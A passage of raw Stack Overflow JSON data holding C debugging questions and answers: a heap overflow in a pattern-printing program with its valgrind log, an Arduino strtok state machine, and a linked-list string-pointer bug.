96780441, "body": "@AmineJonahi Each dimension of your array is<code>nt</code> elements wide.  You allocated that much space for one dimension but not the other."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 1, "last_activity_date": 1551825566, "creation_date": 1551825566, "answer_id": 55012747, "question_id": 55012685, "link": "https://stackoverflow.com/questions/55012685/problem-printing-a-pattern-using-pointers/55012747#55012747", "title": "problem printing a pattern using pointers", "body": "<p>You're not allocating enough memory for each row:</p>\n\n<pre><code>for(i=0;i&lt;nt;i++) pattern[i] = malloc(sizeof(int));\n</code></pre>\n\n<p>Here, you allocate space for only one <code>int</code>.  You need <code>nt</code> of them:</p>\n\n<pre><code>for(i=0;i&lt;nt;i++) pattern[i] = malloc(nt * sizeof(int));\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 11112262, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n5O5U.png?s=128&g=1", "display_name": "Amie Joni", "link": "https://stackoverflow.com/users/11112262/amie-joni"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 55012747, "answer_count": 1, "score": 0, "last_activity_date": 1551825770, "creation_date": 1551825195, "last_edit_date": 1551825770, "question_id": 55012685, "link": "https://stackoverflow.com/questions/55012685/problem-printing-a-pattern-using-pointers", "title": "problem printing a pattern using pointers", "body": "<p>i have a problem with my code and i cannot figure out where is the problem i have tried all things and possible modifications but in vain</p>\n\n<p>as an example when the :</p>\n\n<p>input is 2:</p>\n\n<p>normal output :</p>\n\n<pre><code>2 2 2 \n2 1 2 \n2 2 2 \n</code></pre>\n\n<p>my code output</p>\n\n<pre><code>2 2 2 \n2 1 2 \n2 2 2 \n</code></pre>\n\n<p><strong>this is OK</strong></p>\n\n<p>input is 5:</p>\n\n<p>normal output:</p>\n\n<pre><code>5 5 5 5 5 5 5 5 5 \n5 4 4 4 4 4 4 4 5 \n5 4 3 3 3 3 3 4 5 \n5 4 3 2 2 2 3 4 5 \n5 4 3 2 1 2 3 4 5 \n5 4 3 2 2 2 3 4 5 \n5 4 3 3 3 3 3 4 5 \n5 4 4 4 4 4 4 4 5 \n5 5 5 5 5 5 5 5 5\n</code></pre>\n\n<p>my code output :</p>\n\n<pre><code>5 5 5 5 5 5 5 5 5\n5 4 4 4 4 4 4 4 5\n5 4 3 3 3 3 3 4 5\n5 4 3 2 2 2 3 4 5\n5 4 3 2 1 2 3 4 5\n5 4 3 2 2 2 3 4 5\n5 4 3 3 3 3 3 4 5\n5 4 4 4 4 4 4 4 5\n5 5 5 5 5 5 5 5 540352565\nSegmentation fault (core dumped)\n</code></pre>\n\n<p><strong>this is NOT OK :s</strong></p>\n\n<p>i cannot figure out why this <code>540352565</code> appear in the 8x8 field on my array\nalso <code>Segmentation fault (core dumped)</code> is caused by the free and i think it is related to the mysterious number <code>540352565</code></p>\n\n<p>i would be grateful if someone can help me with this problem :p</p>\n\n<p>so here is my code :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n\n    int n,fs,fe,i,j,nt;\n    int** pattern = NULL;\n    scanf(\"%d\", &amp;n);\n\n    nt = n+(n-1);//number of line\n\n    // Allocating memory\n    pattern=malloc( nt * sizeof(int*));\n    for(i=0;i&lt;nt;i++) pattern[i] = malloc(sizeof(int));\n    printf(\"Start\\n\");\n    // filling pointer with data\n    for(fs=0,fe=nt-1;fs != fe;fs++,fe--){//where to write\n        for(i=fs;i&lt;=fe;i++){\n          printf(\"n=%d,nt=%d,i=%d,fs=%d,fe=%d\\n\",n,nt,i,fs,fe);\n          pattern[fs][i] = n; // line 1\n          pattern[fe][i] = n; // line 2\n          pattern[i][fs] = n; // line 1\n          pattern[i][fe] = n; // line 2\n        }\n        n--;\n    }\n    pattern[nt/2][nt/2] = 1; // the central element\n    //printing pattern\n    for(i=0;i&lt;nt;i++){\n      for (j=0; j&lt;nt; j++)\n        printf(\"%d \",pattern[i][j]);\n      printf(\"\\n\");\n    }\n    //desallocating memory\n    for(i=0;i&lt;nt;i++) free(pattern[i]);\n    free(pattern);\n    return 0;\n}\n</code></pre>\n\n<p>Here is the output of <strong>valgrind</strong> which do memory check</p>\n\n<pre><code>==13198== Memcheck, a memory error detector\n==13198== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.\n==13198== Using Valgrind-3.13.0 and LibVEX; rerun with -h for copyright info\n==13198== Command: ./main 2\n==13198== \n--13198-- Valgrind options:\n--13198--    -v\n--13198-- Contents of /proc/version:\n--13198--   Linux version 4.15.0-45-generic (buildd@lgw01-amd64-031) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019\n--13198-- \n--13198-- Arch and hwcaps: AMD64, LittleEndian, amd64-cx16-rdtscp-sse3-avx\n--13198-- Page sizes: currently 4096, max supported 4096\n--13198-- Valgrind library directory: /usr/lib/valgrind\n--13198-- Reading syms from /home/aminejow/exercism_files/c/pattern/main\n--13198-- Reading syms from /lib/x86_64-linux-gnu/ld-2.27.so\n--13198--   Considering /lib/x86_64-linux-gnu/ld-2.27.so ..\n--13198--   .. CRC mismatch (computed 1b7c895e wanted 2943108a)\n--13198--   Considering /usr/lib/debug/lib/x86_64-linux-gnu/ld-2.27.so ..\n--13198--   .. CRC is valid\n--13198-- Reading syms from /usr/lib/valgrind/memcheck-amd64-linux\n--13198--   Considering /usr/lib/valgrind/memcheck-amd64-linux ..\n--13198--   .. CRC mismatch (computed c25f395c wanted 0a9602a8)\n--13198--    object doesn't have a symbol table\n--13198--    object doesn't have a dynamic symbol table\n--13198-- Scheduler: using generic scheduler lock implementation.\n--13198-- Reading suppressions file: /usr/lib/valgrind/default.supp\n==13198== embedded gdbserver: reading from /tmp/vgdb-pipe-from-vgdb-to-13198-by-aminejow-on-???\n==13198== embedded gdbserver: writing to   /tmp/vgdb-pipe-to-vgdb-from-13198-by-aminejow-on-???\n==13198== embedded gdbserver: shared mem   /tmp/vgdb-pipe-shared-mem-vgdb-13198-by-aminejow-on-???\n==13198== \n==13198== TO CONTROL THIS PROCESS USING vgdb (which you probably\n==13198== don't want to do, unless you know exactly what you're doing,\n==13198== or are doing some strange experiment):\n==13198==   /usr/lib/valgrind/../../bin/vgdb --pid=13198 ...command...\n==13198== \n==13198== TO DEBUG THIS PROCESS USING GDB: start GDB like this\n==13198==   /path/to/gdb ./main\n==13198== and then give GDB the following command\n==13198==   target remote | /usr/lib/valgrind/../../bin/vgdb --pid=13198\n==13198== --pid is optional if only one valgrind process is running\n==13198== \n--13198-- REDIR: 0x401f2f0 (ld-linux-x86-64.so.2:strlen) redirected to 0x58060901 (???)\n--13198-- REDIR: 0x401f0d0 (ld-linux-x86-64.so.2:index) redirected to 0x5806091b (???)\n--13198-- Reading syms from /usr/lib/valgrind/vgpreload_core-amd64-linux.so\n--13198--   Considering /usr/lib/valgrind/vgpreload_core-amd64-linux.so ..\n--13198--   .. CRC mismatch (computed 4b63d83e wanted 670599e6)\n--13198--    object doesn't have a symbol table\n--13198-- Reading syms from /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so\n--13198--   Considering /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so ..\n--13198--   .. CRC mismatch (computed a4b37bee wanted 8ad4dc94)\n--13198--    object doesn't have a symbol table\n==13198== WARNING: new redirection conflicts with existing -- ignoring it\n--13198--     old: 0x0401f2f0 (strlen              ) R-&gt; (0000.0) 0x58060901 ???\n--13198--     new: 0x0401f2f0 (strlen              ) R-&gt; (2007.0) 0x04c32db0 strlen\n--13198-- REDIR: 0x401d360 (ld-linux-x86-64.so.2:strcmp) redirected to 0x4c33ee0 (strcmp)\n--13198-- REDIR: 0x401f830 (ld-linux-x86-64.so.2:mempcpy) redirected to 0x4c374f0 (mempcpy)\n--13198-- Reading syms from /lib/x86_64-linux-gnu/libc-2.27.so\n--13198--   Considering /lib/x86_64-linux-gnu/libc-2.27.so ..\n--13198--   .. CRC mismatch (computed b1c74187 wanted 042cc048)\n--13198--   Considering /usr/lib/debug/lib/x86_64-linux-gnu/libc-2.27.so ..\n--13198--   .. CRC is valid\n--13198-- REDIR: 0x4edac70 (libc.so.6:memmove) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9d40 (libc.so.6:strncpy) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edaf50 (libc.so.6:strcasecmp) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9790 (libc.so.6:strcat) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9d70 (libc.so.6:rindex) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edc7c0 (libc.so.6:rawmemchr) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edade0 (libc.so.6:mempcpy) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edac10 (libc.so.6:bcmp) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9d00 (libc.so.6:strncmp) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9800 (libc.so.6:strcmp) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edad40 (libc.so.6:memset) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ef80f0 (libc.so.6:wcschr) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9ca0 (libc.so.6:strnlen) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9870 (libc.so.6:strcspn) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edafa0 (libc.so.6:strncasecmp) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9840 (libc.so.6:strcpy) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edb0e0 (libc.so.6:memcpy@@GLIBC_2.14) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9da0 (libc.so.6:strpbrk) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed97c0 (libc.so.6:index) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ed9c70 (libc.so.6:strlen) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ee46c0 (libc.so.6:memrchr) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edaff0 (libc.so.6:strcasecmp_l) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edabe0 (libc.so.6:memchr) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4ef8eb0 (libc.so.6:wcslen) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4eda050 (libc.so.6:strspn) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edaf20 (libc.so.6:stpncpy) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edaef0 (libc.so.6:stpcpy) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edc7f0 (libc.so.6:strchrnul) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4edb040 (libc.so.6:strncasecmp_l) redirected to 0x4a2a6e0 (_vgnU_ifunc_wrapper)\n--13198-- REDIR: 0x4eed330 (libc.so.6:__strrchr_sse2) redirected to 0x4c32790 (__strrchr_sse2)\n--13198-- REDIR: 0x4ed3070 (libc.so.6:malloc) redirected to 0x4c2faa0 (malloc)\n--13198-- REDIR: 0x4eed620 (libc.so.6:__strlen_sse2) redirected to 0x4c32d30 (__strlen_sse2)\n--13198-- REDIR: 0x4eed120 (libc.so.6:__strchrnul_sse2) redirected to 0x4c37020 (strchrnul)\n--13198-- REDIR: 0x4ef7440 (libc.so.6:__mempcpy_sse2_unaligned) redirected to 0x4c37130 (mempcpy)\n==13198== Invalid write of size 4\n==13198==    at 0x1089C2: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d530 is 16 bytes after a block of size 16 in arena \"client\"\n==13198== \n==13198== Invalid write of size 4\n==13198==    at 0x108947: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d514 is 0 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n==13198== Invalid write of size 4\n==13198==    at 0x108970: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d794 is 0 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n==13198== Invalid write of size 4\n==13198==    at 0x108999: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d564 is 0 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n==13198== Invalid write of size 4\n==13198==    at 0x108A26: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d660 is 12 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n==13198== Invalid read of size 4\n==13198==    at 0x108A62: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d514 is 0 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n--13198-- REDIR: 0x4ed3950 (libc.so.6:free) redirected to 0x4c30cd0 (free)\nStart\nn=5,nt=9,i=0,fs=0,fe=8\nn=5,nt=9,i=1,fs=0,fe=8\nn=5,nt=9,i=2,fs=0,fe=8\nn=5,nt=9,i=3,fs=0,fe=8\nn=5,nt=9,i=4,fs=0,fe=8\nn=5,nt=9,i=5,fs=0,fe=8\nn=5,nt=9,i=6,fs=0,fe=8\nn=5,nt=9,i=7,fs=0,fe=8\nn=5,nt=9,i=8,fs=0,fe=8\nn=4,nt=9,i=1,fs=1,fe=7\nn=4,nt=9,i=2,fs=1,fe=7\nn=4,nt=9,i=3,fs=1,fe=7\nn=4,nt=9,i=4,fs=1,fe=7\nn=4,nt=9,i=5,fs=1,fe=7\nn=4,nt=9,i=6,fs=1,fe=7\nn=4,nt=9,i=7,fs=1,fe=7\nn=3,nt=9,i=2,fs=2,fe=6\nn=3,nt=9,i=3,fs=2,fe=6\nn=3,nt=9,i=4,fs=2,fe=6\nn=3,nt=9,i=5,fs=2,fe=6\nn=3,nt=9,i=6,fs=2,fe=6\nn=2,nt=9,i=3,fs=3,fe=5\nn=2,nt=9,i=4,fs=3,fe=5\nn=2,nt=9,i=5,fs=3,fe=5\n5 5 5 5 5 5 5 5 5 \n5 4 4 4 4 4 4 4 5 \n5 4 3 3 3 3 3 4 5 \n5 4 3 2 2 2 3 4 5 \n5 4 3 2 1 2 3 4 5 \n5 4 3 2 2 2 3 4 5 \n5 4 3 3 3 3 3 4 5 \n5 4 4 4 4 4 4 4 5 \n5 5 5 5 5 5 5 5 5 \n==13198== \n==13198== HEAP SUMMARY:\n==13198==     in use at exit: 0 bytes in 0 blocks\n==13198==   total heap usage: 12 allocs, 12 frees, 5,228 bytes allocated\n==13198== \n==13198== All heap blocks were freed -- no leaks are possible\n==13198== \n==13198== ERROR SUMMARY: 158 errors from 6 contexts (suppressed: 0 from 0)\n==13198== \n==13198== 1 errors in context 1 of 6:\n==13198== Invalid write of size 4\n==13198==    at 0x108A26: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d660 is 12 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n==13198== \n==13198== 15 errors in context 2 of 6:\n==13198== Invalid write of size 4\n==13198==    at 0x108999: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d564 is 0 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n==13198== \n==13198== 23 errors in context 3 of 6:\n==13198== Invalid write of size 4\n==13198==    at 0x108970: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d794 is 0 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n==13198== \n==13198== 23 errors in context 4 of 6:\n==13198== Invalid write of size 4\n==13198==    at 0x108947: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d514 is 0 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n==13198== \n==13198== 24 errors in context 5 of 6:\n==13198== Invalid write of size 4\n==13198==    at 0x1089C2: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d530 is 16 bytes after a block of size 16 in arena \"client\"\n==13198== \n==13198== \n==13198== 72 errors in context 6 of 6:\n==13198== Invalid read of size 4\n==13198==    at 0x108A62: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198==  Address 0x522d514 is 0 bytes after a block of size 4 alloc'd\n==13198==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==13198==    by 0x1088BC: main (in /home/aminejow/exercism_files/c/pattern/main)\n==13198== \n==13198== ERROR SUMMARY: 158 errors from 6 contexts (suppressed: 0 from 0)\n</code></pre>\n"}, {"tags": ["c", "arduino", "switch-statement"], "comments": [{"owner": {"reputation": 2323, "user_id": 579123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5681309a3b72965a9e5e4651fd38416b?s=128&d=identicon&r=PG&f=1", "display_name": "ItsPete", "link": "https://stackoverflow.com/users/579123/itspete"}, "edited": false, "score": 1, "creation_date": 1551825307, "post_id": 55012540, "comment_id": 96780074, "body": "For extra debugging, print out the state just before the switch statement &amp; see if it is the value that you expect."}, {"owner": {"reputation": 30170, "user_id": 5231607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QzGsq.jpg?s=128&g=1", "display_name": "1201ProgramAlarm", "link": "https://stackoverflow.com/users/5231607/1201programalarm"}, "edited": false, "score": 0, "creation_date": 1551833783, "post_id": 55012540, "comment_id": 96782361, "body": "You don&#39;t show the declaration for <code>instr</code>, or how the input data gets entered in to it.  It is possible that <code>strtok</code> is overwriting <code>state</code> when it sets the nul character at the end of the <code>-1297</code> token."}], "answers": [{"comments": [{"owner": {"reputation": 4562, "user_id": 9254539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b45538511384660bfaef5092e30b7ea?s=128&d=identicon&r=PG&f=1", "display_name": "BessieTheCookie", "link": "https://stackoverflow.com/users/9254539/bessiethecookie"}, "edited": false, "score": 1, "creation_date": 1551833066, "post_id": 55012710, "comment_id": 96782202, "body": "Although often considered to be good practice, it is not necessary to use brackets in control structures containing a single statement. <code>if (i &gt;= 0) tok[i] = &#39;\\0&#39;;</code> is perfectly valid as far as the language is concerned. Writing it on a separate line without brackets is the same as the OP&#39;s code because in C whitespace doesn&#39;t matter."}, {"owner": {"reputation": 47, "user_id": 10773340, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-XQgXUidPBhA/AAAAAAAAAAI/AAAAAAAAIBg/0nCO1-VftkU/photo.jpg?sz=128", "display_name": "yuan cheng", "link": "https://stackoverflow.com/users/10773340/yuan-cheng"}, "reply_to_user": {"reputation": 4562, "user_id": 9254539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b45538511384660bfaef5092e30b7ea?s=128&d=identicon&r=PG&f=1", "display_name": "BessieTheCookie", "link": "https://stackoverflow.com/users/9254539/bessiethecookie"}, "edited": false, "score": 1, "creation_date": 1551834420, "post_id": 55012710, "comment_id": 96782497, "body": "@FeiXiang well then you could probably post your own solution."}], "tags": [], "owner": {"reputation": 47, "user_id": 10773340, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-XQgXUidPBhA/AAAAAAAAAAI/AAAAAAAAIBg/0nCO1-VftkU/photo.jpg?sz=128", "display_name": "yuan cheng", "link": "https://stackoverflow.com/users/10773340/yuan-cheng"}, "is_accepted": false, "score": 3, "last_activity_date": 1551825359, "creation_date": 1551825359, "answer_id": 55012710, "question_id": 55012540, "link": "https://stackoverflow.com/questions/55012540/switch-statement-is-skipped-after-two-iterations-of-while-loop/55012710#55012710", "title": "Switch statement is skipped after two iterations of while loop", "body": "<p>Your if else statement in case 1 is not correct. \nThe first if should be like this</p>\n\n<pre><code>if (i &gt;= 0) {tok[i] = '\\0';}\n</code></pre>\n\n<p>You are missing the brackets.\nAnd the else statement should also be included in brackets like this.</p>\n\n<pre><code>      if (strcmp(tok, \"person\") == 0) \n      {\n        state = 2;\n        Serial.println(state);\n      }\n      else \n      {\n        state = 1000;\n      }\n</code></pre>\n\n<p>Or if it is just one line of code like yours, you could write it in a separate line.</p>\n\n<pre><code>      if (strcmp(tok, \"person\") == 0) \n      {\n        state = 2;\n        Serial.println(state);\n      }\n      else \n        state = 1000;\n</code></pre>\n\n<p>Otherwise it will assign value 1000 to state, that's why the for loop would skip all the switch cases.</p>\n\n<p>My English is not very good. Hope you understand it.</p>\n"}], "owner": {"reputation": 66, "user_id": 10438914, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adf21477f4b66ca5715e7b32e2126b36?s=128&d=identicon&r=PG&f=1", "display_name": "Juzer Zarif", "link": "https://stackoverflow.com/users/10438914/juzer-zarif"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1551825359, "creation_date": 1551824460, "question_id": 55012540, "link": "https://stackoverflow.com/questions/55012540/switch-statement-is-skipped-after-two-iterations-of-while-loop", "title": "Switch statement is skipped after two iterations of while loop", "body": "<p>I am writing a state machine for an Arduino project to parse an input string from Serial1 input. I have a switch statement in a while loop that advances the state:</p>\n\n<pre><code>  char * tok = strtok(instr, \" \\r\\n\"); //instr is the input string\n  int state = 0;\n  int targx = 0, targy = 0;\n\n  while (tok)\n  {\n    // State machine:\n    // 0: start parsing\n    // 1: N2 command, parse prediction\n    // 2: Correct prediction, parse targx\n    // 3: Parse targy\n    // 4: Target parsing complete\n    // 1000: Wrong prediction / unknown command\n    switch (state)\n    {\n      case 0:\n        if (strcmp(tok, \"N2\") == 0) state = 1; \n        else if (strcmp(tok, \"PANGAIN\") == 0) state = 5;\n        else if (strcmp(tok, \"TILTGAIN\") == 0) state = 7;\n        else state = 1000;\n        break;\n\n      case 1:\n          //Look for a person\n          int i = strlen(tok) - 1;\n          while(i &gt;= 0 &amp;&amp; tok[i] != ':') {i--;}\n\n          if (i &gt;= 0) tok[i] = '\\0';\n          Serial.print(\"Here's what it saw: \");\n          Serial.print(tok);\n          Serial.print(\"\\n\");\n          if (strcmp(tok, \"person\") == 0) \n          {\n            state = 2;\n            Serial.println(state);\n          }\n          else state = 1000;\n\n        break;\n\n      case 2:\n        Serial.println(\"Inside case 2\");\n        targx = atoi(tok);\n        Serial.print(\"Targx = \");\n        Serial.print(targx, DEC);\n        Serial.println(\"\");\n        state = 3;\n        break;\n\n      case 3:\n        targy = atoi(tok);\n        Serial.print(\"Targy = \");\n        Serial.print(targy, DEC);\n        Serial.println(\"\");\n        state = 4;\n        break;\n\n      default:\n        break;\n    }\n\n    // Move to the next token:\n    tok = strtok(0, \" \\r\\n\");\n    Serial.println(tok);\n  }\n</code></pre>\n\n<p>The problem I'm having so far is it will get to case 1 and correctly identify that \"person\" is in the token and set the state to 2 but on every iteration of the while loop after that, it just skips the switch statement entirely. Here's what the output looks like for one input string:</p>\n\n<pre><code>Input String: N2 person:66 -1297 -538 2431 1331\n\n&gt; person:66 \n&gt; Here's what it saw: person \n&gt; 2\n&gt; -1297\n&gt; -538 \n&gt; 2431 \n&gt; 1331\n</code></pre>\n\n<p>Can anyone tell me why the switch statement is being bypassed entirely after case 1 is hit? Any and all help is appreciated!</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 3, "creation_date": 1551823883, "post_id": 55012337, "comment_id": 96779505, "body": "You did not store a copy of the name.  You made a local copy and then stored a pointer to it, which became invalid the moment your function returned.  Allocate memory for your string with <code>malloc</code>."}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1551824137, "post_id": 55012337, "comment_id": 96779598, "body": "or use <code>strdup</code> instead of malloc"}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1551824188, "post_id": 55012337, "comment_id": 96779620, "body": "<code>strdup</code> is not part of the standard C library"}], "answers": [{"comments": [{"owner": {"reputation": 1190, "user_id": 3344587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d246b94ff48978d81b706630d0102196?s=128&d=identicon&r=PG&f=1", "display_name": "Loc Tran", "link": "https://stackoverflow.com/users/3344587/loc-tran"}, "edited": false, "score": 0, "creation_date": 1551824844, "post_id": 55012449, "comment_id": 96779878, "body": "why do we remove nameCopy totally? malloc on ttemp-&gt;name and copy between nameCopy and ttemp-&gt;name. Is it better?"}, {"owner": {"reputation": 289, "user_id": 8163401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653dbb04e4c92ad5c0db6870f801a653?s=128&d=identicon&r=PG&f=1", "display_name": "P. Gillich", "link": "https://stackoverflow.com/users/8163401/p-gillich"}, "edited": false, "score": 0, "creation_date": 1551824879, "post_id": 55012449, "comment_id": 96779890, "body": "@paddy Thanks, that totally worked for me. One question about freeing the memory again: I know I&#39;ll have to free it eventually, but do I free it inside the function that allocates it? If I do that, don&#39;t I lose any data I just set aside? By &quot;when you get around to deleting your nodes, do you mean when I no longer need the list anymore?"}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "reply_to_user": {"reputation": 1190, "user_id": 3344587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d246b94ff48978d81b706630d0102196?s=128&d=identicon&r=PG&f=1", "display_name": "Loc Tran", "link": "https://stackoverflow.com/users/3344587/loc-tran"}, "edited": false, "score": 0, "creation_date": 1551828615, "post_id": 55012449, "comment_id": 96781067, "body": "@LocTran it doesn&#39;t really make a difference, and is a matter of style and taste.  In this case, it&#39;s a minimal solution for an isolated piece of code to match the original post."}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "reply_to_user": {"reputation": 289, "user_id": 8163401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653dbb04e4c92ad5c0db6870f801a653?s=128&d=identicon&r=PG&f=1", "display_name": "P. Gillich", "link": "https://stackoverflow.com/users/8163401/p-gillich"}, 